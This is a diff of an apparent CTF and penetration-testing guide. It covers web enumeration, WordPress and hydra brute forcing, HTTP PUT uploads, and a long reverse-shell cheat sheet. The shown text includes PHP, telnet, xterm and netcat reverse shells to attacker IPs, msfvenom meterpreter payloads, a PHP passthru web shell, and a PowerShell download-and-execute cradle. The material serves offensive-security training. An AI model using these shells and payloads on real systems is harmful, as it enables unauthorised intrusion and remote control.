+<p>There will be some days, when you won’t find vulnerability with searchsploit. In this case, we should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a>, if someone has reported any bug for that particular software that we can exploit.</p>
 </div>
 <div class="section" id="google-vulns">
 <h3>Google-Vulns<a class="headerlink" href="#google-vulns" title="Permalink to this headline">¶</a></h3>
-<p>It is suggested that whenever you are googling something,  also try with the words such as ctf, github, python, tool etc. For example. Let’s say, you are stuck in a docker or in a specific cms. Search for docker ctf or &lt;cms_name&gt; ctf/ github etc.</p>
+<p>It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your searchterm. For example. Let’s say, you are stuck in a docker or on a specific cms search for docker ctf or &lt;cms_name&gt; ctf/ github etc.</p>
 </div>
 <div class="section" id="webservices">
 <h3>Webservices<a class="headerlink" href="#webservices" title="Permalink to this headline">¶</a></h3>
-<p>If a webserver is running on the machine, we can start with running</p>
+<p>If a webserver is running on a machine, we can start with running</p>
 <div class="section" id="whatweb">
 <h4>whatweb<a class="headerlink" href="#whatweb" title="Permalink to this headline">¶</a></h4>
-<p>Utilize whatweb to find what server is running.</p>
+<p>Utilize whatweb to find what software stack a server is running.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>whatweb www.example.com
 http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], Country[INDIA][IN], Email[infosecurity@zmail.example.com], Google-Analytics[Universal][UA-6386XXXXX-2], HTML5, HTTPServer[Example Webserver], HttpOnly[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], IP[XXX.XX.XX.208], JQuery[1.11.0], Kentico-CMS, Modernizr, Script[text/javascript], Title[Welcome to Example Website ][Title element contains newline(s)!], UncommonHeaders[cteonnt-length,x-cache-control-orig,x-expires-orig], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=9,IE=edge]
 </pre></div>
@@ -575,7 +603,8 @@ http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,ci
 </div>
 <div class="section" id="nikto">
 <h4>nikto<a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h4>
-<p>nikto - Scan web server for known vulnerabilities. It would examine a web server to find potential problems and security vulnerabilities, including:</p>
+<p>nikto - Scans a web server for known vulnerabilities.</p>
+<p>It will examine a web server to find potential problems and security vulnerabilities, including:</p>
 <ul class="simple">
 <li>Server and software misconfigurations</li>
 <li>Default files and programs</li>
@@ -583,31 +612,45 @@ http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,ci
 <li>Outdated servers and programs</li>
 </ul>
 </div>
-<div class="section" id="burpsuite-spider">
-<h4>BurpSuite Spider<a class="headerlink" href="#burpsuite-spider" title="Permalink to this headline">¶</a></h4>
-<p>There would be some cases where dirb/ dirbuster won’t find anything. Happened with us on a Node.js web application. Burpsuite spider helped in finding extra-pages which contained the credentials.</p>
-</div>
 <div class="section" id="dirb-wfuzz-dirbuster">
 <h4>dirb, wfuzz, dirbuster<a class="headerlink" href="#dirb-wfuzz-dirbuster" title="Permalink to this headline">¶</a></h4>
-<p>Further, we can execute to find any hidden directories.</p>
+<p>Furthermore, we can run the following programs to find any hidden directories.</p>
 <ul class="simple">
-<li><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.</li>
-<li><a class="reference external" href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing a image. Most of the time, now we need to figure out which image is different. Here, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.</li>
+<li><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.</li>
+<li><a class="reference external" href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing an image. Most of the time, we then need to figure out which image is different. In this case, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.</li>
 <li><a class="reference external" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">Dirbuster</a> : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers.</li>
 </ul>
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
-<p class="last">If the using the dirb/ wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.</p>
+<p class="last">Probably, we will be using common.txt (/usr/share/wordlists/dirb/) . If it’s doesn’t find anything, it’s better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn’t work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)</p>
 </div>
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
-<p class="last">Probably, we would be using common.txt in /usr/share/wordlists/dirb/ . If it’s doesn’t find anything, it’s better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn’t work out, try searching with extensions .txt, .js, .html, .php. (.txt by default and rest application based)</p>
+<p class="last">If using the dirb/ wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.</p>
 </div>
+</div>
+<div class="section" id="burpsuite-spider">
+<h4>BurpSuite Spider<a class="headerlink" href="#burpsuite-spider" title="Permalink to this headline">¶</a></h4>
+<p>There will be some cases when dirb/ dirbuster doesn’t find anything. This happened with us on a Node.js web application. Burpsuite’s spider helped in finding extra-pages which contained the credentials.</p>
+</div>
+<div class="section" id="parameter-fuzz">
+<h4>Parameter Fuzz?<a class="headerlink" href="#parameter-fuzz" title="Permalink to this headline">¶</a></h4>
+<p>Sometime, we might have a scenario where we have a website which might be protected by WAF.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/example
+</pre></div>
+</div>
+<p>Now, this “/example” might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest thing is that we can find the GET parameters by fuzzing “/example” only if you get some errors from the application, so, the goal is to fuzz using a special char as the parameter’s value, something like: “/example?FUZZ=’ “</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;User-Agent: SomethingNotObivousforWAF&quot; &quot;http://IP/example?FUZZ=&#39;&quot;
+</pre></div>
+</div>
+<p>The other things which may try is putting a valid command such as ‘ls, test’ so it becomes FUZZ=ls or FUZZ=test</p>
+<p><strong>TODO: gobuster ??</strong></p>
 </div>
 <div class="section" id="put-method">
 <h4>PUT Method<a class="headerlink" href="#put-method" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.</p>
-<p>Curl command can be used to check the options available:</p>
+<p>Sometimes, it is also a good option to check for the various HTTP verbs that are available such as GET, PUT, DELETE, etc.
+This can be done by making an OPTIONS request.</p>
+<p>Curl can be used to check the available options (supported http verbs):</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>curl -X OPTIONS -v http://192.168.126.129/test/
 Trying 192.168.126.129…
 Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
@@ -628,8 +671,8 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 * Connection #0 to host 192.168.126.129 left intact
 </pre></div>
 </div>
-<p>The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
-<p>The few are</p>
+<p>The PUT method allows you to upload a file. Which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
+<p>A few are:</p>
 <ul class="simple">
 <li>Nmap:</li>
 </ul>
@@ -653,7 +696,7 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 </div>
 <div class="section" id="wordpress">
 <h4>Wordpress<a class="headerlink" href="#wordpress" title="Permalink to this headline">¶</a></h4>
-<p>When running wpscan, also make sure you run –enumerate u for enumerating usernames. By default wpscan doesn’t run it. Also, scan for plugins</p>
+<p>When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run –enumerate u for enumerating usernames because by default wpscan doesn’t run it. Also, scan for plugins</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>wpsscan
   --url       | -u &lt;target url&gt;       The WordPress URL/domain to scan.
   --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
@@ -672,22 +715,29 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
       If no option is supplied, the default is &quot;vt,tt,u,vp&quot;
 </pre></div>
 </div>
-<p>Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username</p>
+<p>We can also use wpscan to bruteforce password for a username</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
 </pre></div>
 </div>
-<div class="admonition tip">
-<p class="first admonition-title">Tip</p>
-<p class="last">If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance &gt; Editor &gt; Possibly edit 404 Template.</p>
+<p>Tips</p>
+<ul class="simple">
+<li>If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance &gt; Editor &gt; Possibly edit 404 Template.</li>
+<li>The configuration of worpdress is normally speaking stored in wp-config.php. If you are able to download it, you might be luckiy and be able to loot plaintext username and passwords to database or wp-admin page.</li>
+<li>If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.</li>
+<li>Got wordpress credentials, may be utilize <a class="reference external" href="https://wordpress.org/plugins/wpterm/">WPTerm</a> xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.</li>
+<li>If there’s a custom plugin created, probably, it would be in the location</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/wp-content/plugins/custompluginname
+</pre></div>
 </div>
-<div class="admonition tip">
-<p class="first admonition-title">Tip</p>
-<p class="last">If there’s exists a SQL-Injection, by which we are able to extract wordpress user and password hash. However, password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.</p>
+</div></blockquote>
+<p><strong>todo: elborate more on wp scanning and vulnerabilities?</strong></p>
 </div>
-</div>
-<div class="section" id="names-possible-usernames-possible-passwords">
-<h4>Names? Possible Usernames? Possible Passwords?<a class="headerlink" href="#names-possible-usernames-possible-passwords" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/ https webserver), you would find possible  names of the employees working in the company. Now, it is common practice to have username based on your first/ last name. Superkojiman has written a script <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.</p>
+<div class="section" id="names-possible-usernames-passwords">
+<h4>Names? Possible Usernames &amp; Passwords?<a class="headerlink" href="#names-possible-usernames-passwords" title="Permalink to this headline">¶</a></h4>
+<p>Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, then we are left with a large amount of potential usernames with no passwords.</p>
+<p>If the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.</p>
 <ul class="simple">
 <li>Using metasploit smtp_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.</li>
 <li>Using VRFY command:</li>
@@ -697,8 +747,8 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 <div class="section" id="brute-forcing-hydra">
 <h4>Brute forcing: hydra<a class="headerlink" href="#brute-forcing-hydra" title="Permalink to this headline">¶</a></h4>
 <p>Hydra can be used to brute force login web pages</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
--p PASS  or -P FILE try password PASS, or load several passwords from FILE
+<div class="highlight-None"><div class="highlight"><pre><span></span>-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)
+-p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)
 -U        service module usage details
 -e nsr additional checks, &quot;n&quot; for null password, &quot;s&quot; try login as pass, &quot;r&quot; try the reverse login as pass
 </pre></div>
@@ -709,17 +759,17 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 </div>
 <p><strong>Help for module http-post-form</strong></p>
 <p>Module http-post-form requires the page and the parameters for the web form.</p>
-<p>By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three “:” separated values, plus optional values.</p>
+<p>The parameters take three “:” separated values, plus optional values.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
 </pre></div>
 </div>
 <ul class="simple">
 <li>First is the page on the server to GET or POST to (URL).</li>
-<li>Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced in the “^USER^” and “^PASS^” placeholders (FORM PARAMETERS)</li>
+<li>Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the “^USER^” and “^PASS^” placeholders (FORM PARAMETERS)</li>
 <li>Third is the string that it checks for an <em>invalid</em> login (by default) Invalid condition login check can be preceded by “F=”, successful condition login check must be preceded by “S=”. This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!</li>
 <li>The following parameters are optional:
 C=/page/uri     to define a different page to gather initial cookies from
-(h|H)=My-Hdr: foo   to send a user defined HTTP header with each request     ^USER^ and ^PASS^ can also be put into these headers!</li>
+(h|H)=My-Hdr: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!</li>
 </ul>
 <blockquote>
 <div><ul class="simple">
@@ -727,12 +777,12 @@ C=/page/uri     to define a different page to gather initial cookies from
 </ul>
 <blockquote>
 <div><ul class="simple">
-<li>‘h’ will add the user-defined header at the end     regardless it’s already being sent by Hydra or not.</li>
+<li>‘h’ will add the user-defined header at the end regardless it’s already being sent by Hydra or not.</li>
 <li>‘H’ will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end</li>
 </ul>
 </div></blockquote>
 <ul class="simple">
-<li>Note that if you are going to put colons (:) in your headers you should escape them with a backslash (). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.</li>
+<li>Note that if you are going to put colons (:) in your headers you should escape them with a backslash (). All colons that aren’t option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.</li>
 </ul>
 </div></blockquote>
 <p>Examples:</p>
@@ -743,11 +793,12 @@ C=/page/uri     to define a different page to gather initial cookies from
 &quot;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&quot;
 </pre></div>
 </div>
+<p><strong>TODO ncrack?</strong></p>
 </div>
 </div>
 <div class="section" id="reverse-shells">
 <h3>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permalink to this headline">¶</a></h3>
-<p>Possibly, we would have figured out some vulnerablity in the services running or misconfiguration and can have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and some more.</p>
+<p>Possibly, we would have figured out some vulnerability or misconfiguration in the running services which allows us to have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.</p>
 <div class="section" id="netcat-nc">
 <h4>netcat (nc)<a class="headerlink" href="#netcat-nc" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
@@ -785,7 +836,7 @@ C=/page/uri     to define a different page to gather initial cookies from
 <div class="highlight-None"><div class="highlight"><pre><span></span>&lt;? passthru($_GET[&quot;cmd&quot;]); ?&gt;
 </pre></div>
 </div>
-<p>which can be accessed by</p>
+<p>which can then be accessed by</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/shell.php?cmd=id
 </pre></div>
 </div>
@@ -813,8 +864,10 @@ C=/page/uri     to define a different page to gather initial cookies from
 <li><strong>PHP Meterpreter</strong></li>
 </ul>
 <blockquote>
-<div><p>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
+<div>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</div></blockquote>
+<p><strong>todo explain how to set up a multi handler</strong></p>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
 </pre></div>
 </div>
 </div></blockquote>
@@ -822,11 +875,11 @@ C=/page/uri     to define a different page to gather initial cookies from
 <li><strong>PHP Reverse Shell</strong></li>
 </ul>
 <blockquote>
-<div><p>PHP Trick: This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6</p>
+<div><p>The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>php -r &#39;$sock=fsockopen(&quot;192.168.56.101&quot;,1337);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
 </pre></div>
 </div>
-<p>The above can be connected by listening at port 1337 by using nc</p>
+<p>The above can be connected to by listening on port 1337 by using nc</p>
 </div></blockquote>
 </div>
 <div class="section" id="weevely">
@@ -839,7 +892,7 @@ C=/page/uri     to define a different page to gather initial cookies from
 <div class="highlight-None"><div class="highlight"><pre><span></span>weevely http://192.168.1.2/location_of_payload password
 </pre></div>
 </div>
-<p>However, it wasn’t as useful as php meterpreter or reverse shell.</p>
+<p>However, it wasn’t as useful as php meterpreter or a reverse shell.</p>
 </div>
 <div class="section" id="ruby">
 <h4>Ruby<a class="headerlink" href="#ruby" title="Permalink to this headline">¶</a></h4>
@@ -945,7 +998,7 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 </div>
 <div class="section" id="xterm">
 <h4>XTerm<a class="headerlink" href="#xterm" title="Permalink to this headline">¶</a></h4>
-<p>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
+<p>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>xterm -display <span class="m">10</span>.0.0.1:1
 </pre></div>
 </div>
@@ -960,7 +1013,8 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 </div>
 <div class="section" id="lynx">
 <h4>Lynx<a class="headerlink" href="#lynx" title="Permalink to this headline">¶</a></h4>
-<p>Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx “guest accounts” and other public services. More details <a class="reference external" href="http://insecure.org/sploits/lynx.download.html">LynxShell</a></p>
+<p>Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs.
+This is a big security hole for sites that use lynx “guest accounts” and other public services. More details <a class="reference external" href="http://insecure.org/sploits/lynx.download.html">LynxShell</a></p>
 <p>When you start up a lynx client session, you can hit “g” (for Goto) and then enter the following URL:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null
 </pre></div>
@@ -982,7 +1036,7 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 </div>
 </div></blockquote>
 <ul class="simple">
-<li>If you have sql-shell from sqlmap/ phpmyadmin, we can use</li>
+<li>If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.</li>
 </ul>
 <blockquote>
 <div><div class="highlight-None"><div class="highlight"><pre><span></span>select load_file(&#39;/etc/passwd&#39;);
@@ -995,7 +1049,7 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 <p>If there’s a way, we can execute code from windows, we may try</p>
 <ul class="simple">
 <li>Powershell Empire/ Metasploit Web-Delivery Method</li>
-<li>Invoke-Shellcode</li>
+<li>Invoke-Shellcode (from powersploit)</li>
 </ul>
 <blockquote>
 <div><div class="highlight-None"><div class="highlight"><pre><span></span>Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;http://YourIPAddress:8000/Invoke-Shellcode.ps1&#39;); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force&quot;
@@ -1005,6 +1059,12 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 <ul class="simple">
 <li>Upload ncat and execute</li>
 </ul>
+</div>
+<div class="section" id="msf-meterpreter-elf">
+<h4>MSF Meterpreter ELF<a class="headerlink" href="#msf-meterpreter-elf" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446
+</pre></div>
+</div>
 </div>
 <div class="section" id="metasploit-msfvenom">
 <h4>Metasploit MSFVenom<a class="headerlink" href="#metasploit-msfvenom" title="Permalink to this headline">¶</a></h4>
@@ -1035,10 +1095,10 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </div>
 </div>
 <div class="section" id="spawning-a-tty-shell">
-<span id="id6"></span><h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
+<span id="id7"></span><h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
 <p>Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a class="reference external" href="https://netsec.ws/?p=337">Spawning a TTY Shell</a> and <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> has provided multiple ways to get a tty shell</p>
-<div class="section" id="id8">
-<h4>Python<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id9">
+<h4>Python<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 </pre></div>
 </div>
@@ -1056,8 +1116,8 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </pre></div>
 </div>
 </div>
-<div class="section" id="id9">
-<h4>Perl<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id10">
+<h4>Perl<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>perl -e <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
 </pre></div>
 </div>
@@ -1065,8 +1125,8 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </pre></div>
 </div>
 </div>
-<div class="section" id="id10">
-<h4>Ruby<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id11">
+<h4>Ruby<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>ruby: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
 </pre></div>
 </div>
@@ -1100,8 +1160,8 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </div>
 <p>Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.</p>
 </div>
-<div class="section" id="id11">
-<h4>Nmap<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id12">
+<h4>Nmap<a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h4>
 <p>(From within nmap)</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>!sh
 </pre></div>
@@ -1135,8 +1195,8 @@ interact
 <div class="highlight-None"><div class="highlight"><pre><span></span>standard in must be a tty
 </pre></div>
 </div>
-<p>The su command would work from a terminal, however, would not take in raw stuff via the shell’s Standard Input.</p>
-<p>We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell</p>
+<p>The su command would work from a terminal, however, would not take in raw stuff via the shell’s Standard Input.
+We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>(sleep 1; echo password) | python -c &quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&quot;
 root
 </pre></div>
@@ -1147,7 +1207,7 @@ root
 <div class="section" id="spawning-a-fully-interactive-ttys-shell">
 <h3>Spawning a Fully Interactive TTYs Shell<a class="headerlink" href="#spawning-a-fully-interactive-ttys-shell" title="Permalink to this headline">¶</a></h3>
 <p><a class="reference external" href="https://twitter.com/ropnop">Ronnie Flathers</a> has already written a great blog on <a class="reference external" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading simple shells to fully interactive TTYs</a> Hence, almost everything is taken from that blog and kept here for completion purposes.</p>
-<p>Many times, we would not get a fully interactive shell which means</p>
+<p>Many times, we will not get a fully interactive shell therefore it will/ have:</p>
 <ul class="simple">
 <li>Difficult to use the text editors like vim</li>
 <li>No tab-complete</li>
@@ -1166,13 +1226,13 @@ root
 </pre></div>
 </div>
 <p>If socat isn’t installed, download standalone binaries that can be downloaded from <a class="reference external" href="https://github.com/andrew-d/static-binaries">static binaries</a></p>
-<p>Download the correct architecture socat binary to a writable directoy, chmod it, then execute</p>
+<p>Download the correct binary architecture of socat to a writable directory, chmod it, execute</p>
 </div>
 <div class="section" id="stty">
 <h4>stty<a class="headerlink" href="#stty" title="Permalink to this headline">¶</a></h4>
 <p>Use the methods mentioned in <a class="reference internal" href="#spawning-a-tty-shell"><span class="std std-ref">Spawning a TTY Shell</span></a></p>
-<p>Once bash is running in the PTY, background the shell with Ctrl-Z</p>
-<p>While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it</p>
+<p>Once bash is running in the PTY, background the shell with Ctrl-Z
+While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>echo $TERM
 xterm-256color
 </pre></div>
@@ -1187,7 +1247,7 @@ isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echo
 </pre></div>
 </div>
 <p>The information needed is the TERM type (“xterm-256color”) and the size of the current TTY (“rows 38; columns 116”)</p>
-<p>With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:</p>
+<p>With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>stty raw -echo
 </pre></div>
 </div>
@@ -1241,13 +1301,13 @@ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0
 </div>
 <div class="section" id="restricted-shell">
